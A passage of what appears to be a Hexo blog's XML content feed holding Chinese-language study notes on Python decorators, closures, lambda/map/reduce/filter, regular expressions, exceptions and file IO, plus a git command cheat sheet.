class="string">&#x27;p1&#x27;</span>)</span><br><span class="line">f2(<span class="string">&#x27;p1&#x27;</span>,<span class="string">&#x27;p2&#x27;</span>)</span><br></pre></td></tr></table></figure><p>当某函数有关键字参数呢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decorator</span>(<span class="params">func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args,**kw</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(time.time())</span><br><span class="line">        func(*args,**kw)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"><span class="meta">@decorator</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f3</span>(<span class="params">**kw</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(kw)</span><br><span class="line">f3(name=<span class="string">&#x27;manu&#x27;</span>,age=<span class="number">19</span>)</span><br></pre></td></tr></table></figure><p>这时装饰器就算完整了，适用所有函数</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 装饰器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>函数编程</title>
      <link href="/Programming/Python/function-programmin.html"/>
      <url>/Programming/Python/function-programmin.html</url>
      
        <content type="html"><![CDATA[<p> 高阶函数编程</p><span id="more"></span><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>定义：在内部函数中，对外部的变量进行引用，外部函数返回内部函数。简单来说，闭包=环境+函数块</p><p>例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p</span>():</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">go</span>(<span class="params">step</span>):</span></span><br><span class="line">        <span class="keyword">nonlocal</span> x</span><br><span class="line">        new_pos = x + step</span><br><span class="line">        x = new_pos</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    <span class="keyword">return</span> go</span><br><span class="line">t = p()</span><br><span class="line"><span class="built_in">print</span>(t(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(t(<span class="number">5</span>)) </span><br></pre></td></tr></table></figure><h2 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h2><p>也叫lambda表达式，强调表达式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> parameter_list: expression</span><br></pre></td></tr></table></figure><h2 id="三元表达式"><a href="#三元表达式" class="headerlink" title="三元表达式"></a>三元表达式</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a <span class="keyword">if</span> a &gt; b <span class="keyword">else</span> b</span><br></pre></td></tr></table></figure><h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 会将list的数据都传入 fun函数 接收</span></span><br><span class="line"><span class="built_in">map</span>(fun,<span class="built_in">list</span>)</span><br></pre></td></tr></table></figure><ul><li>fun可以用lambda</li><li>参数可以有多个</li><li>返回的列表个数取决于参数列表个数的最小值</li><li>返回的是一个对象</li></ul><h2 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line">l = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">t = reduce(<span class="keyword">lambda</span> x,y: x+y,l )</span><br><span class="line"><span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure><ul><li>他会对lambda进行连续调用</li><li>上面的运行过程是：先从<code>l</code>取出1,2相加，结果传入x，再从<code>l</code>取出3传入y..</li><li>还可以指定一个初始值传入x</li></ul><h2 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l2 = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line">f = <span class="built_in">filter</span>(<span class="keyword">lambda</span> x: <span class="built_in">ord</span>(x)&gt;=<span class="number">65</span> <span class="keyword">and</span> <span class="built_in">ord</span>(x)&lt;<span class="number">91</span>,l2)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(f))</span><br></pre></td></tr></table></figure><ul><li>将列表的数据传入函数，结果为真保留数据</li><li>结果只要能判断真假就行，不一定需要布尔值</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 闭包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git指令</title>
      <link href="/devTool/git.html"/>
      <url>/devTool/git.html</url>
      
        <content type="html"><![CDATA[<p>记录一些日常常用指令，参考<br><a href="https://www.liaoxuefeng.com/wiki/896043488029600/896827951938304">廖雪峰的git教程</a></p><blockquote><p>ssh协议不需要每次输密码，使用的是密钥对</p><p>https协议需要每次输入账户名和密码</p></blockquote><span id="more"></span><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;Your Name&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;email@example.com&quot;</span></span><br></pre></td></tr></table></figure><p><code>git init</code>初始化git repo</p><p><code>git add filename1 filename2</code>添加至暂存区</p><p><code>git commit -m &quot;commit-mes&quot;</code>提交到本地库，会得到40位的哈希值id，类似快照</p><ul><li>直接输入git commit会进入vim让你写提交信息</li><li><strong>使用单引号输入多行信息</strong></li></ul><p><code>git commit amend</code>修改上一个提交</p><p><code>git status</code>显示工作区状态</p><p><code>git diff filename</code>如果有文件被修改过，可以使用diff查看修改的内容</p><ul><li>diff格式@@ -1,2 +1,4@@表示“修改前的1行开始连续2行变成了修改后的1行连续4行”</li></ul><p><code>git log</code>查看提交历史</p><p><code>git reset --hard commit_id</code>回退版本</p><ul><li>HEAD^表示前一个版本</li><li>HEAD3表示三个^</li></ul><p><code>git reflog</code>查看命令历史，可以得到每个版本的commit_id</p><p><code>git checkout -- filename</code>丢弃工作区的修改回到最新版本</p><p><code>git reset HEAD filename</code>该文件回到最近一次commit或者丢弃暂存区的修改</p><p><code>git rm filename</code>删除文件，然后提交；手动删除，add-commit也行</p><h3 id="连接远程仓库"><a href="#连接远程仓库" class="headerlink" title="连接远程仓库"></a>连接远程仓库</h3><p>在家目录下打开终端输入<code>ssh-keygen -t rsa -C email.com</code></p><p>得到密钥对，将公钥添加到远程仓库即可</p><p><code>git remote add origin git@sever-name:path/repo-name.git</code>关联远程仓库</p><p><code>git push -u origin master</code>第一次推送</p><p><code>git push orgin master</code>后续推送（可选择不同的分支）</p><p><code>git clone git@sever-name:path/repo-name.git</code>克隆远程仓库</p><ul><li><p>默认克隆只有master分支</p></li><li><p>想要在其他分支工作必须创建并关联远程分支</p></li><li><p><code>git switch -c branch-name origin/branch-name</code>创建，此时已经可以提交了</p><ul><li>当你和其他工作伙伴同时在同一分支提交同一个修改时，会出现以下情况</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ git push origin dev </span><br><span class="line">Username <span class="keyword">for</span> <span class="string">&#x27;https://github.com&#x27;</span>: yangchaohe</span><br><span class="line">Password <span class="keyword">for</span> <span class="string">&#x27;https://yangchaohe@github.com&#x27;</span>: </span><br><span class="line">To https://github.com/yangchaohe/learngit.git</span><br><span class="line"> ! [rejected]        dev -&gt; dev (fetch first)</span><br><span class="line">error: 推送一些引用到 <span class="string">&#x27;https://github.com/yangchaohe/learngit.git&#x27;</span> 失败</span><br><span class="line">提示：更新被拒绝，因为远程仓库包含您本地尚不存在的提交。这通常是因为另外</span><br><span class="line">提示：一个仓库已向该引用进行了推送。再次推送前，您可能需要先整合远程变更</span><br><span class="line">提示：（如 <span class="string">&#x27;git pull ...&#x27;</span>）。</span><br><span class="line">提示：详见 <span class="string">&#x27;git push --help&#x27;</span> 中的 <span class="string">&#x27;Note about fast-forwards&#x27;</span> 小节。</span><br><span class="line"><span class="comment"># manu @ MY in ~/learngit on git:dev o [20:26:31] C:1</span></span><br><span class="line">$ git pull </span><br><span class="line">remote: Enumerating objects: 5, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (5/5), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (2/2), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 3 (delta 0), reused 3 (delta 0), pack-reused 0</span><br><span class="line">展开对象中: 100% (3/3), 284 字节 | 94.00 KiB/s, 完成.</span><br><span class="line">来自 https://github.com/yangchaohe/learngit</span><br><span class="line">   f3e318a..df2aa02  dev        -&gt; origin/dev</span><br><span class="line">当前分支没有跟踪信息。</span><br><span class="line">请指定您要合并哪一个分支。</span><br><span class="line">详见 git-pull(1)。</span><br><span class="line"></span><br><span class="line">    git pull &lt;远程&gt; &lt;分支&gt;</span><br><span class="line"></span><br><span class="line">如果您想要为此分支创建跟踪信息，您可以执行：</span><br><span class="line"></span><br><span class="line">    git branch --set-upstream-to=origin/&lt;分支&gt; dev</span><br></pre></td></tr></table></figure><ul><li>使用<code>git branch --set-upstream-to=origin/&lt;分支&gt; dev</code>关联远程仓库的分支</li><li>再使用<code>git pull</code>将其他提交抓取下来进行修改再push</li><li><code>git remote -v</code>查看远程仓库信息</li></ul></li><li><p>多个伙伴在同一个分支提交时，提交历史会分叉，使用<code>git rebase</code>即可</p></li></ul><h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h3><p><code>git branch</code>查看当前分支</p><p><code>git branch &lt;name&gt;</code>create branch</p><p><code>git switch/checkout &lt;name&gt;</code>切换分支</p><p><code>git switch -c &lt;name&gt;,git checkout -b &lt;name&gt;</code>创建并切换</p><p><code>git merge &lt;name&gt; -m &lt;message&gt;</code>合并分支</p><p><code>git branch -d &lt;name&gt;</code>删除分支</p><p>如果两个分支同时修改同一个文件的同一行内容，合并时就会发生冲突（修改不同行不会）</p><p>此时查看文件内容如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; <span class="string">HEAD</span></span><br><span class="line"><span class="string">master90</span></span><br><span class="line"><span class="string">=======</span></span><br><span class="line"><span class="string">test190</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;&gt;&gt;&gt;&gt; test1</span></span><br></pre></td></tr></table></figure><p>需要修改再提交，然后使用<code>git log --graph --pretty=oneline --abbrev-commit</code>可以查看分支合并情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*   f47d28d (HEAD -&gt; master) confict fix</span><br><span class="line">|\  </span><br><span class="line">| * 9c16d81 (test1) test1</span><br><span class="line">* | 082c980 master</span><br><span class="line">* | 0ada1fe Merge branch <span class="string">&#x27;test1&#x27;</span></span><br><span class="line">|\| </span><br><span class="line">| * 3b4a2fd 位于分支 test1 要提交的变更：   （使用 <span class="string">&quot;git restore --staged &lt;文件&gt;...&quot;</span> 以取消暂存）        修改：     readme.txt</span><br><span class="line">* | 771f5e1 位于分支 master 要提交的变更：   （使用 <span class="string">&quot;git restore --staged &lt;文件&gt;...&quot;</span> 以取消暂存）       修改：     readme.txt</span><br><span class="line">|/  </span><br><span class="line">* 73c59da tset</span><br><span class="line">* 48be542 remove rademetxt</span><br><span class="line">* bd16a3e A A A A</span><br><span class="line">* bb669d2 <span class="built_in">test</span> test2</span><br></pre></td></tr></table></figure><p>使用<code>git log --graph</code>可以查看详细提交信息</p><blockquote><p>注意，<code>git merge</code>默认是“Fast-forword（改变指针指向）”模式，这样的合并是没有记录历史分支的，从图上也就看不出是否分支，需要加上<code>--no-ff</code>使用普通模式合并</p><p>一般工作都是在dev上，master用来发布</p></blockquote><ul><li>当在其他的分支工作没完，想把工作状态存储在那个分支时，需要使用stash</li></ul><p><code>git stash</code>将工作状态暂存，可存储多个</p><p><code>git stash pop</code>取出最后放入的工作状态，并删除stash的内容</p><p><code>git stash apply@&#123;index&#125;</code>指定取出，不删除</p><p><code>git stash drop</code>删除最后放入的工作状态</p><p><code>git stash show</code>显示详细信息</p><blockquote><p>存储顺序有点像先进后出</p></blockquote><ul><li>当在别的分支修改的数据想应用到其他分支时，只需要在其他分支复制一份提交即可</li></ul><p>指令：<code>git cherry-pick &lt;commit_id&gt;</code></p><p>复制除了提交id不一样，其他包括提交信息，时间都一样</p><ul><li>如果要丢弃一个没有被合并过的分支，可以通过<code>git branch -D</code>强行删除</li></ul><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><p>描述每个版本不可能用哈希值，git使用tag与commit_id结合起来</p><p><code>git tag &lt;tagname&gt; &lt;commit_id&gt;</code>会默认把当前的HEAD打上标签，可在后面指定commit-id</p><p><code>git tag &lt;tagname&gt; -m &quot;描述&quot;</code></p><p><code>git tag</code>查看所有标签</p><p><code>git show &lt;tagname&gt;</code>显示详细信息</p><p><code>git push origin &lt;tagname&gt;</code>推送某标签到远程仓库</p><p><code>git push origin --tags</code>推送所有标签</p><p> <code>git tag -d &lt;tagname&gt;</code>删除本地标签</p><p>删除远程仓库的标签要先删本地标签再使用指令</p><p><code>git push origin :refs/tags/&lt;tagname&gt;</code></p><h3 id="忽略"><a href="#忽略" class="headerlink" title="忽略"></a>忽略</h3><p>如果需要忽略某些文件时，可以编写.gitgnore文件，在里面写上文件名即可，<a href="https://github.com/github/gitignore">官方模板</a></p><h3 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git config --global alias.st status</span><br><span class="line">git config --global alias.unstage <span class="string">&quot;reset HEAD&quot;</span></span><br><span class="line">git config --global alias.br branch</span><br><span class="line">git config --global alias.ci commit</span><br><span class="line">git config --global alias.co checkout</span><br><span class="line">git config --global alias.st status</span><br><span class="line">git config --global alias.lg <span class="string">&quot;log --color --graph --pretty=format:&#x27;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&#x27; --abbrev-commit&quot;</span></span><br></pre></td></tr></table></figure><h3 id="status中文乱码"><a href="#status中文乱码" class="headerlink" title="status中文乱码"></a>status中文乱码</h3><p>默认的配置里, 使用中文命名并使用git status查看会得到中文的字符码, 可以通过下面的指令解决</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global core.quotepath <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>或者修改配置文件<code>~/.gitconfig</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[gui]  </span><br><span class="line">    encoding = utf-8  </span><br><span class="line">    <span class="comment"># 代码库统一使用utf-8  </span></span><br><span class="line">[i18n]  </span><br><span class="line">    commitencoding = utf-8  </span><br><span class="line">    <span class="comment"># log编码  </span></span><br><span class="line">[svn]  </span><br><span class="line">    pathnameencoding = utf-8  </span><br><span class="line">    <span class="comment"># 支持中文路径  </span></span><br><span class="line">[core]</span><br><span class="line">    quotepath = <span class="literal">false</span> </span><br><span class="line">    <span class="comment"># status引用路径不再是八进制（反过来说就是允许显示中文了）</span></span><br></pre></td></tr></table></figure><blockquote><p>参考<a href="https://blog.csdn.net/u012145252/article/details/81775362#解决git-status不能显示中文">解决git-status不能显示中文</a></p></blockquote><h3 id="git-修改本地和远程分支名称"><a href="#git-修改本地和远程分支名称" class="headerlink" title="git 修改本地和远程分支名称"></a>git 修改本地和远程分支名称</h3><p><code>git branch -a</code> #查看所有分支<br><code>git branch -r</code> #查看远程分支<br><code>git branch -vv</code> #查看本地分支所关联的远程分支<br><code>git branch -m old_branch new_branch</code> # Rename branch locally<br><code>git push origin :old_branch</code> # Delete the old branch<br><code>git push --set-upstream origin new_branch</code><br>或者<br><code>git push -u origin new_branch</code># Push the new branch, set local branch to track the new remote</p><blockquote><p>当远程分支显示不全时，使用<code>git fetch</code>可以抓取远程分支</p></blockquote><h3 id="submodule"><a href="#submodule" class="headerlink" title="submodule"></a>submodule</h3><p><a href="https://zhuanlan.zhihu.com/p/100214931">Git子仓库深入浅出</a></p>]]></content>
      
      
      <categories>
          
          <category> 开发工具 </category>
          
          <category> git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python正则</title>
      <link href="/Programming/Python/regEXP.html"/>
      <url>/Programming/Python/regEXP.html</url>
      
        <content type="html"><![CDATA[<p> python的正则</p><span id="more"></span><h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h2><h3 id="贪婪"><a href="#贪婪" class="headerlink" title="贪婪"></a>贪婪</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尽量满足6</span></span><br><span class="line">re.findall(<span class="string">&quot;[a-z]&#123;3,6&#125;&quot;</span>,<span class="built_in">list</span>)</span><br></pre></td></tr></table></figure><h3 id="非贪婪"><a href="#非贪婪" class="headerlink" title="非贪婪"></a>非贪婪</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尽量满足3</span></span><br><span class="line">re.findall(<span class="string">&quot;[a-z]&#123;3,6&#125;?&quot;</span>,<span class="built_in">list</span>)</span><br></pre></td></tr></table></figure><p><code>.</code>可以匹配除换行(\n)的任意字符</p><p><code>I</code>标志可以忽略大小写</p><p><code>S</code>标志可以匹配任意字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">re.findall(<span class="string">&quot;^test&quot;</span>,<span class="built_in">list</span>,re.I | re.S)</span><br><span class="line"><span class="comment"># &quot;|&quot;不是或的意思，在这里表示与</span></span><br></pre></td></tr></table></figure><h2 id="查找并替换"><a href="#查找并替换" class="headerlink" title="查找并替换"></a>查找并替换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用法一</span></span><br><span class="line">re.sub(<span class="string">&quot;regular&quot;</span>,<span class="string">&quot;substitute&quot;</span>,string)</span><br><span class="line"><span class="comment">#用法二</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_fun</span>(<span class="params">value</span>):</span></span><br><span class="line">    v = value.group()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;[&quot;</span>+v+<span class="string">&quot;]&quot;</span></span><br><span class="line">re.sub(<span class="string">&quot;regular&quot;</span>,sub_fun,string)</span><br></pre></td></tr></table></figure><h2 id="match-search"><a href="#match-search" class="headerlink" title="match,search"></a>match,search</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找字符开头开头</span></span><br><span class="line">r = re.match(<span class="string">&quot;re&quot;</span>,string)</span><br><span class="line"><span class="comment"># 在字符里查找到就返回</span></span><br><span class="line">r2 = re.search(<span class="string">&quot;re&quot;</span>,string)</span><br><span class="line"><span class="comment"># 上面返回的都是Match对象</span></span><br><span class="line"><span class="comment"># group返回查找到的值</span></span><br><span class="line"><span class="built_in">print</span>(r.group())</span><br><span class="line"><span class="comment"># span返回查找到的位置</span></span><br><span class="line"><span class="built_in">print</span>(r2.span())</span><br></pre></td></tr></table></figure><h2 id="group"><a href="#group" class="headerlink" title="group"></a>group</h2><p>查找到的字符串是一个大组，给group()传递参数可以取得指定的组，不传递参数默认是0（即所有内容），可同时传递多个参数如group(1,2)，匹配第一个组和第二个组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="string">&quot;&lt;h1&gt;Test&lt;/h1&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">r3 = re.search(<span class="string">&quot;&lt;h1&gt;(.*)&lt;/h1&gt;&quot;</span>,b)</span><br><span class="line"><span class="built_in">print</span>(r3.group(<span class="number">1</span>))</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">r3 = re.findall(<span class="string">&quot;&lt;h1&gt;(.*)&lt;/h1&gt;&quot;</span>,b)</span><br><span class="line"><span class="built_in">print</span>(r3)</span><br></pre></td></tr></table></figure><p>groups()可直接得到里面的分组的数据而不需要传递参数，当然findall更方便</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正则表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>异常处理</title>
      <link href="/Programming/Python/exception.html"/>
      <url>/Programming/Python/exception.html</url>
      
        <content type="html"><![CDATA[<p> 把这个单独写是不是太水了</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    i = <span class="number">9</span>/<span class="number">0</span></span><br><span class="line"><span class="comment"># 捕捉异常</span></span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;0不能做分母&quot;</span>)</span><br><span class="line"><span class="comment"># 没出现异常执行的代码（可不写）</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;没有异常&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;end&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 异常处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件IO</title>
      <link href="/Programming/Python/IO.html"/>
      <url>/Programming/Python/IO.html</url>
      
        <content type="html"><![CDATA[<p> 操作文件</p><span id="more"></span><h2 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 打印当前目录</span></span><br><span class="line"><span class="built_in">print</span>(os.getcwd())</span><br><span class="line"><span class="comment"># 改变工作目录</span></span><br><span class="line">os.chdir(<span class="string">&quot;/home/manu&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(os.getcwd())</span><br><span class="line"><span class="comment"># 创建目录</span></span><br><span class="line">os.makedirs(<span class="string">&quot;test1/test2&quot;</span>)</span><br><span class="line"><span class="comment"># 读取文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;blog/_config.yml&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    content = file.read()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line"><span class="comment"># 读取行</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;blog/_config.yml&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        <span class="built_in">print</span>(line.rstrip())</span><br><span class="line"><span class="comment"># 放在列表里面</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;blog/_config.yml&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    l = file.readlines()</span><br></pre></td></tr></table></figure><h2 id="写入"><a href="#写入" class="headerlink" title="写入"></a>写入</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="comment"># 覆盖</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pytext.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">&quot;hello,world!&quot;</span>)</span><br><span class="line"><span class="comment"># 追加</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pytext.txt&quot;</span>,<span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">&quot;hello,world!&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO流 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>类</title>
      <link href="/Programming/Python/class.html"/>
      <url>/Programming/Python/class.html</url>
      
        <content type="html"><![CDATA[<p> 类的定义与继承</p><span id="more"></span><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>():</span></span><br><span class="line">    <span class="comment"># 构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name,age</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age  = age</span><br><span class="line">    <span class="comment"># self必须写，代表自身</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span 